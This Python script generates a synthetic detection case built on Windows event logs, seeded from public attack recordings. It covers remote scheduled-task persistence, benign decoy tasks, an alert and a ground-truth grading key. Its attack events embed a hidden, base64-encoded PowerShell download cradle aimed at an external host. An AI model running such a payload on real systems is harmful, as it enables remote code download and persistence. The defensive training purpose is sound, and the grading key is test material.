#!/usr/bin/env python3
"""Generate cases/schtask-persist: a scheduled-task persistence that installs, then fires.

The fourth case, second on Windows host telemetry (JSON lines). Two public
EVTX-ATTACK-SAMPLES recordings supply the mechanics, every identifier is re-seeded, and
the events are rebased into a synthetic estate of benign Security and Sysmon activity:

  Lateral Movement/LM_ScheduledTask_ATSVC_target_host.evtx   4624 type-3, 5145 atsvc pipe,
                                                             4698 task registered
  Lateral Movement/LM_sysmon_remote_task_src_powershell.evtx powershell + taskschd.dll

The scenario's point is a NEW timing signature: not a single short chain (wmi-lsass), not
periodic (http-c2), not bursty (dns-tunnel), but **install-then-fire** -- two phases split
by a long idle gap. A remote actor registers a scheduled task (install), and ~an hour
later the task's PowerShell payload runs on its own schedule, in SYSTEM context, with NO
logon behind it (fire). The two phases are tied by the payload itself: the base64 command
in the task's action (4698 TaskContent) is the same base64 the fired process runs -- a
distinctive value on lines an hour apart, the shared-identifier join the synthesis recap
surfaces.

The alert fires only on the tip -- "a scheduled task was registered on <host>" -- and does
not evaluate who registered it, from where, what its action is, or whether it later ran.
Benign task registrations (GoogleUpdate, Edge, SCCM) happen on every host all day, so the
shallow signature is worthless alone; the intrusion is visible only by reading the task's
action, its source, and the un-parented execution it caused.

Logs are JSON lines; keys are ordered so ts/event_id/computer lead and the long
discriminators (TaskContent, CommandLine) trail.

Usage:
    python3 scripts/make_schtask_case.py [--out cases/schtask-persist]
                                         [--evtx-dir cases/_evtx] [--target-mb 1.4]
GROUND_TRUTH.md is written to the case root, NOT into logs/, so analyze.py never reads it.
"""
from __future__ import annotations

import argparse
import json
import random
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from pathlib import Path

SEED = 20260908

# -- the estate ------------------------------------------------------------------------
DOMAIN = "CORP"
VICTIM_HOST = "WKS-4212"
VICTIM_IP = "10.12.34.62"
VICTIM_MAC = "00:1b:44:11:71:5c"
ATTACK_USER = "svc_helpdesk"          # local admin, no business installing a remote task
ATTACK_USER_SID = "S-1-5-21-341049218-2894104772-1560093651-1188"
SOURCE_HOST = "WKS-2190"
SOURCE_IP = "10.12.34.75"
SOURCE_MAC = "00:1b:44:11:5a:3d"
TASK_NAME = r"\Microsoft\Windows\Servicing\HealthTelemetryUpdater"
# The base64 payload -- the join token, long and high-entropy, in the task action (install)
# and the fired command line (fire), an hour apart.
PAYLOAD_B64 = (
    "JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4Ad2ViAGMAbABpAGUAbgB0ADsAJABjAC4A"
    "ZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMQAyAC4A"
    "cQByADkAdgB4ADcAbQBuAGsAMwBkAGYAOAB6AHcAMgBhAGoANQBoAGwAMAB0AGIANgBjAGUAcQA5AA=="
)
FIRE_CMD = f"powershell.exe -NoP -NonI -W Hidden -Enc {PAYLOAD_B64}"

MGMT_HOST = "SRV-SCCM01"
MGMT_IP = "10.12.34.8"
MGMT_USER = "svc_sccm"
JUMP_HOST = "SRV-JUMP01"
JUMP_IP = "10.12.34.9"
FILESRV_IP = "10.12.34.10"
BENIGN_TASKS = [
    (r"\Microsoft\Windows\GoogleUpdateTaskMachineUA",
     r"C:\Program Files\Google\Update\GoogleUpdate.exe /ua /installsource scheduler"),
    (r"\Microsoft\Windows\MicrosoftEdgeUpdateTaskMachineCore",
     r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe /c"),
    (r"\Microsoft\Windows\CCM\ConfigMgr Client Health Evaluation",
     r"C:\Windows\CCM\ccmeval.exe"),
    (r"\Microsoft\Windows\Defrag\ScheduledDefrag",
     r"C:\Windows\system32\defrag.exe -c -h -o $(Arg0)"),
    (r"\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
     r"C:\Windows\system32\usoclient.exe StartScan"),
]

USERS = ["a.lindqvist", "m.okafor", "s.haldorsen", "t.almeida", "p.novak", "j.chen",
         "r.delgado", "k.andersson"]
HOSTS = [("WKS-4201", "10.12.34.21"), ("WKS-4213", "10.12.34.23"),
         ("WKS-4224", "10.12.34.24"), ("WKS-4240", "10.12.34.40"),
         ("WKS-4251", "10.12.34.51"), (VICTIM_HOST, VICTIM_IP)]
DC_HOST = "SRV-DC01"
BENIGN_IMAGES = [
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    r"C:\Users\{user}\AppData\Local\Microsoft\Teams\current\Teams.exe",
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\SearchIndexer.exe",
    r"C:\Program Files\Git\bin\git.exe",
]

WINDOW_START = datetime(2026, 9, 8, 8, 0, 0, tzinfo=timezone.utc)
WINDOW_END = WINDOW_START + timedelta(hours=3)
SPAN_S = (WINDOW_END - WINDOW_START).total_seconds()
INSTALL_AT = WINDOW_START + timedelta(minutes=34)
FIRE_AT = WINDOW_START + timedelta(hours=1, minutes=38)   # ~64 min after install

_NS = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}


def parse_evtx(path: Path) -> list[dict]:
    """Every record of one .evtx as a flat dict. Requires python-evtx (extras: cases)."""
    import Evtx.Evtx as evtx

    events: list[dict] = []
    with evtx.Evtx(str(path)) as log:
        for record in log.records():
            root = ET.fromstring(record.xml())
            system = root.find("e:System", _NS)
            provider = system.find("e:Provider", _NS)
            event: dict = {
                "event_id": int(system.findtext("e:EventID", default="0", namespaces=_NS)),
                "ts": system.find("e:TimeCreated", _NS).get("SystemTime"),
                "computer": system.findtext("e:Computer", namespaces=_NS),
                "channel": system.findtext("e:Channel", namespaces=_NS),
                "provider": provider.get("Name") if provider is not None else "",
            }
            data = root.find("e:EventData", _NS)
            if data is not None:
                for d in data.findall("e:Data", _NS):
                    name, value = d.get("Name"), (d.text or "").strip()
                    if name and value and value != "-":
                        event[name] = value
            events.append(event)
    return events


def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond:06d}Z"


class Generator:
    def __init__(self, rng: random.Random, evtx_dir: Path) -> None:
        self.rng = rng
        self.evtx_dir = evtx_dir
        self.rows: list[tuple[float, str, dict]] = []
        self.ground_truth: dict[str, object] = {}

    def _emit(self, ts: datetime, channel: str, obj: dict) -> None:
        self.rows.append((ts.timestamp(), channel, obj))

    def _logon_id(self) -> str:
        return f"0x{self.rng.randint(0x10000, 0xffffff):08x}"

    def _guid(self) -> str:
        return (
            f"{{{self.rng.randint(0, 0xffffffff):08x}-{self.rng.randint(0, 0xffff):04x}-"
            f"{self.rng.randint(0, 0xffff):04x}-{self.rng.randint(0, 0xffff):04x}-"
            f"{self.rng.randint(0, 0xffffffffffff):012x}}}"
        )

    def _pid(self) -> str:
        return f"0x{self.rng.randint(0x400, 0x4fff):04x}"

    # -- event builders ----------------------------------------------------------------
    def _logon(self, ts, computer, user, sid, logon_type, src_ip, src_host, logon_id,
               proc="NtLmSsp", pkg="NTLM") -> None:
        self._emit(ts, "security", {
            "ts": _iso(ts), "event_id": 4624, "channel": "Security", "computer": computer,
            "provider": "Microsoft-Windows-Security-Auditing",
            "TargetUserName": user, "TargetDomainName": DOMAIN, "TargetUserSid": sid,
            "TargetLogonId": logon_id, "LogonType": logon_type,
            "IpAddress": src_ip, "WorkstationName": src_host,
            "LogonProcessName": proc, "AuthenticationPackageName": pkg,
        })

    def _pipe_access(self, ts, computer, user, logon_id, src_ip, pipe) -> None:
        self._emit(ts, "security", {
            "ts": _iso(ts), "event_id": 5145, "channel": "Security", "computer": computer,
            "provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserName": user, "SubjectDomainName": DOMAIN, "SubjectLogonId": logon_id,
            "IpAddress": src_ip, "ShareName": r"\\*\IPC$", "RelativeTargetName": pipe,
            "AccessMask": "0x3",
        })

    def _task_registered(self, ts, computer, user, task_name, action, logon_id="0x0") -> None:
        # 4698. TaskContent is the scheduled task XML; the action command sits inside it.
        content = (
            '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2">'
            "<Triggers><CalendarTrigger><StartBoundary>2026-09-08T09:38:00</StartBoundary>"
            "<ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger>"
            "</Triggers><Principals><Principal><UserId>S-1-5-18</UserId>"
            "<RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
            f"<Actions><Exec><Command>{action}</Command></Exec></Actions></Task>"
        )
        self._emit(ts, "security", {
            "ts": _iso(ts), "event_id": 4698, "channel": "Security", "computer": computer,
            "provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserName": user, "SubjectDomainName": DOMAIN, "SubjectLogonId": logon_id,
            "TaskName": task_name, "TaskContent": content,
        })

    def _process(self, ts, computer, user, logon_id, image, parent_image, command_line="") -> None:
        self._emit(ts, "security", {
            "ts": _iso(ts), "event_id": 4688, "channel": "Security", "computer": computer,
            "provider": "Microsoft-Windows-Security-Auditing",
            "SubjectUserName": user, "SubjectDomainName": DOMAIN, "SubjectLogonId": logon_id,
            "NewProcessName": image, "ParentProcessName": parent_image,
            "NewProcessId": self._pid(), "TokenElevationType": "%%1936",
            "CommandLine": command_line,
        })

    def _sysmon_create(self, ts, computer, user, image, parent_image, command_line, logon_id) -> None:
        self._emit(ts, "sysmon", {
            "ts": _iso(ts), "event_id": 1, "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": computer, "provider": "Microsoft-Windows-Sysmon",
            "User": f"{DOMAIN}\\{user}", "LogonId": logon_id,
            "Image": image, "ParentImage": parent_image,
            "ProcessGuid": self._guid(), "CommandLine": command_line,
        })

    def _sysmon_net(self, ts, computer, image, dst_ip, dst_port) -> None:
        self._emit(ts, "sysmon", {
            "ts": _iso(ts), "event_id": 3, "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer": computer, "provider": "Microsoft-Windows-Sysmon",
            "Image": image, "SourceIp": self._host_ip(computer), "DestinationIp": dst_ip,
            "DestinationPort": str(dst_port), "Protocol": "tcp",
            "ProcessGuid": self._guid(),
        })

    @staticmethod
    def _host_ip(computer: str) -> str:
        for h, ip in HOSTS:
            if h == computer:
                return ip
        return "10.12.34.99"

    # -- the attack: install now, fire ~an hour later ----------------------------------
    def attack(self) -> None:
        lm = parse_evtx(self.evtx_dir / "LM_ScheduledTask_ATSVC_target_host.evtx")
        sample_logon = next(e for e in lm if e["event_id"] == 4624 and e.get("LogonType") == "3"
                            and e.get("IpAddress", "").count(".") == 3)
        sample_task = next(e for e in lm if e["event_id"] == 4698)
        self.ground_truth["evtx_source_records"] = (
            f"ATSVC 4624 type {sample_logon['LogonType']} proc "
            f"{sample_logon.get('LogonProcessName')}, 5145 atsvc pipe, 4698 task "
            f"{sample_task.get('TaskName')}"
        )

        # PHASE 1 -- install: network logon, atsvc pipe, task registered by svc_helpdesk.
        t = INSTALL_AT
        logon_id = self._logon_id()
        self._logon(t, VICTIM_HOST, ATTACK_USER, ATTACK_USER_SID, "3", SOURCE_IP, SOURCE_HOST,
                    logon_id, proc=sample_logon.get("LogonProcessName", "NtLmSsp"),
                    pkg=sample_logon.get("AuthenticationPackageName", "NTLM"))
        t += timedelta(seconds=self.rng.uniform(0.3, 0.9))
        self._pipe_access(t, VICTIM_HOST, ATTACK_USER, logon_id, SOURCE_IP, "atsvc")
        t += timedelta(seconds=self.rng.uniform(0.2, 0.6))
        self._task_registered(t, VICTIM_HOST, ATTACK_USER, TASK_NAME, FIRE_CMD, logon_id)
        install_end = t

        # PHASE 2 -- fire: ~an hour later the task runs, spawned by the scheduler under
        # SYSTEM, with NO logon in front of it. The command is the same payload.
        t = FIRE_AT
        self._process(t, VICTIM_HOST, f"{VICTIM_HOST}$", "0x3e7",
                      r"C:\Windows\System32\svchost.exe", r"C:\Windows\System32\services.exe")
        t += timedelta(seconds=self.rng.uniform(0.05, 0.2))
        ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        taskeng = r"C:\Windows\System32\svchost.exe"
        self._process(t, VICTIM_HOST, f"{VICTIM_HOST}$", "0x3e7", ps, taskeng, command_line=FIRE_CMD)
        self._sysmon_create(t, VICTIM_HOST, f"{VICTIM_HOST}$", ps, taskeng, FIRE_CMD, "0x3e7")
        t += timedelta(seconds=self.rng.uniform(0.4, 1.5))
        self._sysmon_net(t, VICTIM_HOST, ps, "185.12.71.9", 443)   # payload calls out

        self.ground_truth.update({
            "install_at": _iso(INSTALL_AT), "fire_at": _iso(FIRE_AT),
            "gap_min": round((FIRE_AT - install_end).total_seconds() / 60, 1),
            "task_name": TASK_NAME, "attack_user": ATTACK_USER,
        })

    # -- background --------------------------------------------------------------------
    def _rand_ts(self) -> datetime:
        return WINDOW_START + timedelta(seconds=self.rng.uniform(0, SPAN_S))

    def background_logons(self, n: int) -> None:
        for _ in range(n):
            ts = self._rand_ts()
            host, _ip = self.rng.choice(HOSTS)
            user = self.rng.choice(USERS)
            sid = f"S-1-5-21-341049218-2894104772-1560093651-{self.rng.randint(1100, 1180)}"
            roll = self.rng.random()
            if roll < 0.55:
                self._logon(ts, host, user, sid, "2", "-", host, self._logon_id(),
                            proc="User32", pkg="Negotiate")
            elif roll < 0.9:
                self._logon(ts, host, user, sid, "3", FILESRV_IP, "SRV-FS01", self._logon_id())
            else:
                self._emit(ts, "security", {
                    "ts": _iso(ts), "event_id": 4625, "channel": "Security", "computer": host,
                    "provider": "Microsoft-Windows-Security-Auditing",
                    "TargetUserName": user, "TargetDomainName": DOMAIN, "LogonType": "3",
                    "IpAddress": FILESRV_IP, "Status": "0xc000006d",
                })

    def background_processes(self, n: int) -> None:
        for _ in range(n):
            ts = self._rand_ts()
            host, _ip = self.rng.choice(HOSTS)
            user = self.rng.choice(USERS)
            image = self.rng.choice(BENIGN_IMAGES).format(user=user)
            parent = r"C:\Windows\explorer.exe" if "svchost" not in image else \
                r"C:\Windows\System32\services.exe"
            logon_id = self._logon_id()
            self._process(ts, host, user, logon_id, image, parent)
            if self.rng.random() < 0.6:
                self._sysmon_create(ts, host, user, image, parent, f'"{image}"', logon_id)

    def background_dc(self, n: int) -> None:
        for _ in range(n):
            ts = self._rand_ts()
            user = self.rng.choice(USERS)
            eid = self.rng.choice([4768, 4769, 4776])
            self._emit(ts, "security", {
                "ts": _iso(ts), "event_id": eid, "channel": "Security", "computer": DC_HOST,
                "provider": "Microsoft-Windows-Security-Auditing",
                "TargetUserName": user, "TargetDomainName": DOMAIN,
                "IpAddress": self.rng.choice([ip for _h, ip in HOSTS]),
                "ServiceName": self.rng.choice(["krbtgt", "SRV-FS01$"]), "Status": "0x0",
            })

    # -- decoys ------------------------------------------------------------------------
    def decoy_benign_tasks(self, n: int) -> None:
        """Killer decoy: benign scheduled tasks REGISTER (4698, same event as the attack)
        and later FIRE (4688/Sysmon-1 spawned by svchost) on every host, all day. The
        discriminator is the task's action, not that a task exists."""
        for _ in range(n):
            ts = self._rand_ts()
            host, _ip = self.rng.choice(HOSTS)
            name, action = self.rng.choice(BENIGN_TASKS)
            # registration, by the mgmt account or SYSTEM
            self._task_registered(ts, host, self.rng.choice([MGMT_USER, f"{host}$"]),
                                  name, action, self._logon_id())
            # a benign fire: svchost spawns the task's binary, no logon
            t2 = ts + timedelta(seconds=self.rng.uniform(1, 30))
            image = action.split(" ")[0].strip('"')
            self._process(t2, host, f"{host}$", "0x3e7", image,
                          r"C:\Windows\System32\svchost.exe", command_line=action)
            if self.rng.random() < 0.5:
                self._sysmon_create(t2, host, f"{host}$", image,
                                    r"C:\Windows\System32\svchost.exe", action, "0x3e7")
        self.ground_truth["decoy_tasks"] = n

    def decoy_admin_schtasks(self, n: int) -> None:
        """An admin interactively creates maintenance tasks via schtasks.exe (type-2 logon,
        cmd -> schtasks). Privileged, local, authorised."""
        for _ in range(n):
            ts = self._rand_ts()
            host, _ip = self.rng.choice(HOSTS)
            lid = self._logon_id()
            self._logon(ts, host, "t.admin", "S-1-5-21-341049218-2894104772-1560093651-1003",
                        "2", "-", host, lid, proc="User32", pkg="Negotiate")
            t2 = ts + timedelta(seconds=self.rng.uniform(2, 8))
            name = r"\CorpIT\NightlyCleanup"
            self._task_registered(t2, host, "t.admin", name,
                                  r"C:\Windows\System32\cleanmgr.exe /sagerun:1", lid)
        self.ground_truth["decoy_admin"] = n

    def decoy_admin_rdp(self, n: int) -> None:
        for _ in range(n):
            ts = self._rand_ts()
            host, _ip = self.rng.choice(HOSTS)
            self._logon(ts, host, "t.admin", "S-1-5-21-341049218-2894104772-1560093651-1003",
                        "10", JUMP_IP, JUMP_HOST, self._logon_id(), proc="Negotiate", pkg="Negotiate")
        self.ground_truth["decoy_rdp"] = n

    # -- render ------------------------------------------------------------------------
    def render(self, channel: str) -> str:
        rows = sorted((r for r in self.rows if r[1] == channel), key=lambda r: r[0])
        return "\n".join(json.dumps(o, separators=(",", ":")) for _t, _c, o in rows) + "\n"

    def count(self, channel: str) -> int:
        return sum(1 for r in self.rows if r[1] == channel)


def dhcp_log() -> str:
    """Leases so the victim and the install's source host both resolve. Victim ACK L4,
    RENEW L8; source host L6."""
    rows = [
        "2026-09-08 06:50:11 ACK 10.12.34.21 00:1b:44:11:3a:b7 WKS-4201 lease=28800",
        "2026-09-08 07:03:40 ACK 10.12.34.40 3c:22:fb:80:12:9e WKS-4240 lease=28800",
        "2026-09-08 07:18:52 ACK 10.12.34.51 00:1b:44:11:52:31 WKS-4251 lease=28800",
        f"2026-09-08 07:31:09 ACK {VICTIM_IP} {VICTIM_MAC} {VICTIM_HOST} lease=28800",
        "2026-09-08 07:40:20 ACK 10.12.34.8 00:25:90:aa:31:7d SRV-SCCM01 lease=86400",
        f"2026-09-08 07:57:44 ACK {SOURCE_IP} {SOURCE_MAC} {SOURCE_HOST} lease=28800",
        "2026-09-08 08:05:02 ACK 10.12.34.23 00:1b:44:11:3a:c1 WKS-4213 lease=28800",
        f"2026-09-08 11:31:09 RENEW {VICTIM_IP} {VICTIM_MAC} {VICTIM_HOST} lease=28800",
    ]
    return "\n".join(rows) + "\n"


def alert_json() -> dict:
    return {
        "alert_id": "SENTINEL-2026-09-08-0083517",
        "detector": "sysmon-sigma",
        "rule_name": "Scheduled Task Registered (Security 4698)",
        "status": "open",
        "severity": "medium",
        "first_seen": "2026-09-08T08:34:02Z",
        "last_seen": "2026-09-08T08:34:02Z",
        "summary": (
            f"A Sigma rule matched a scheduled-task registration (Event ID 4698) on "
            f"{VICTIM_HOST}. The rule fires on any task creation; it does not read the "
            f"task's action, evaluate who registered it or from where, or check whether "
            f"the task subsequently ran."
        ),
        "entities": [
            {"kind": "host", "value": VICTIM_HOST, "note": "host where the task was registered"},
            {"kind": "process", "value": "schtasks", "note": "scheduled task subsystem"},
        ],
        "raw_detector_fields": {
            "product": "sysmon-sigma", "sigma_level": "medium",
            "channel": "Security", "event_id": "4698", "mitre": "T1053.005",
        },
    }


def ground_truth_md(stats: dict) -> str:
    return f"""# Ground truth — cases/schtask-persist

Generated by `scripts/make_schtask_case.py` (seed {SEED}). This file sits at the case root,
**not** in `logs/`, so `analyze.py` never reads it. Use it to grade the brief.

Windows host telemetry (Security + Sysmon), one JSON object per line. Derived from two
public EVTX-ATTACK-SAMPLES recordings ({stats['evtx_source_records']}); every identifier is
re-seeded.

## What actually happened

Scheduled-task persistence on **{VICTIM_HOST} / {VICTIM_IP}**, in **two phases separated by
~{stats['gap_min']} minutes** — install, then fire:

- **Install (~{stats['install_at']}):** a network (type-3) logon to the victim as
  `{DOMAIN}\\{ATTACK_USER}` — a help-desk account with local admin — **from {SOURCE_IP}
  ({SOURCE_HOST})**, touching the **`atsvc` named pipe** over IPC$ (the ATSVC remote
  scheduled-task interface), then **registering a task** (Event ID 4698)
  `{TASK_NAME}` whose action is an **encoded PowerShell command** (`powershell -Enc <b64>`).
- **Fire (~{stats['fire_at']}):** the task runs on its own schedule — `powershell.exe`
  spawned by `svchost.exe` (the scheduler) in **SYSTEM context with NO logon in front of
  it**, running the *same* base64 payload, which then calls out to 185.12.71.9:443.
- **The join:** the base64 payload in the 4698 task action and in the fired command line is
  identical — that is what ties the install to the execution an hour later.
- **Timing:** install-then-fire, two phases across a ~1 h idle gap. Not a single chain, not
  periodic, not bursty. A `timeline` over the task name/payload shows two clusters an hour
  apart.

## The decoys — all benign, all task-shaped

A brief that flags any of these as the intrusion is producing false positives:

1. **Benign scheduled tasks** ({stats['decoy_tasks']} register+fire pairs) — GoogleUpdate,
   EdgeUpdate, SCCM ccmeval, defrag, USO — register (4698, the *exact* event the alert
   matched) and fire (svchost → binary) on every host all day. The discriminator is the
   task's **action** (a signed vendor binary vs an encoded PowerShell payload), not that a
   task exists.
2. **Admin schtasks** ({stats['decoy_admin']}) — an admin interactively (type-2) creates a
   `cleanmgr` maintenance task. Authorised, local, benign action.
3. **Admin RDP** ({stats['decoy_rdp']}) — type-10 logons from the jump host.
4. **Backup service** — high-volume type-3 logons from the file server.

## Grading the brief

A good brief should:

- name the **source of the type-3 logon** — {SOURCE_IP}, and {SOURCE_HOST} via `dhcp.log`;
- name the **account** `{ATTACK_USER}` and that it is out of place installing a task;
- identify the **task registration** (4698) `{TASK_NAME}` and that its **action is an
  encoded PowerShell payload**, distinct from the benign vendor tasks;
- tie the **registration to the later execution** — the same base64 payload runs when the
  task fires, an hour later, under SYSTEM with no logon;
- describe the timing as **install-then-fire across a ~1 h gap**, not a single chain;
- **not** flag the benign task decoys — or if it mentions them, distinguish them by action;
- record what it could not determine (no payload decode, no network capture of the callout).

## Volumes

| | lines |
|---|---|
| total events | {stats['total']} |
| security.jsonl | {stats['security']} |
| sysmon.jsonl | {stats['sysmon']} |
| attack chain | {stats['attack_events']} |
| benign task decoy | {stats['decoy_tasks']} register+fire pairs |
"""


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    parser.add_argument("--out", default="cases/schtask-persist")
    parser.add_argument("--evtx-dir", default="cases/_evtx")
    parser.add_argument("--target-mb", type=float, default=1.4)
    args = parser.parse_args()

    rng = random.Random(SEED)
    gen = Generator(rng, Path(args.evtx_dir))

    gen.attack()
    attack_events = len(gen.rows)
    gen.decoy_benign_tasks(120)
    gen.decoy_admin_schtasks(40)
    gen.decoy_admin_rdp(70)

    target_bytes = int(args.target_mb * 1_000_000)
    gen.background_logons(400)
    gen.background_processes(400)
    gen.background_dc(200)
    for _ in range(3):
        size = len(gen.render("security")) + len(gen.render("sysmon"))
        if size >= target_bytes:
            break
        recent = gen.rows[-400:]
        per_line = sum(len(json.dumps(o, separators=(",", ":"))) for _t, _c, o in recent) / len(recent)
        need = int((target_bytes - size) / per_line)
        gen.background_logons(max(1, need // 3))
        gen.background_processes(max(1, need // 3))

    out = Path(args.out)
    (out / "logs").mkdir(parents=True, exist_ok=True)
    (out / "logs" / "security.jsonl").write_text(gen.render("security"), encoding="utf-8")
    (out / "logs" / "sysmon.jsonl").write_text(gen.render("sysmon"), encoding="utf-8")
    (out / "logs" / "dhcp.log").write_text(dhcp_log(), encoding="utf-8")
    (out / "alert.json").write_text(json.dumps(alert_json(), indent=2) + "\n", encoding="utf-8")

    stats = {
        **gen.ground_truth,
        "attack_events": attack_events,
        "security": gen.count("security"),
        "sysmon": gen.count("sysmon"),
        "total": len(gen.rows),
    }
    (out / "GROUND_TRUTH.md").write_text(ground_truth_md(stats), encoding="utf-8")

    print(f"wrote {out}/")
    print(f"  logs/security.jsonl  {stats['security']} events")
    print(f"  logs/sysmon.jsonl    {stats['sysmon']} events")
    print("  logs/dhcp.log        8 leases")
    print(f"  alert.json           sysmon-sigma 4698 task registered on {VICTIM_HOST}")
    print(f"  attack: install {stats['install_at']} -> fire {stats['fire_at']} "
          f"(~{stats['gap_min']} min gap); task {stats['task_name']}; "
          f"decoys: {stats['decoy_tasks']} benign tasks")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
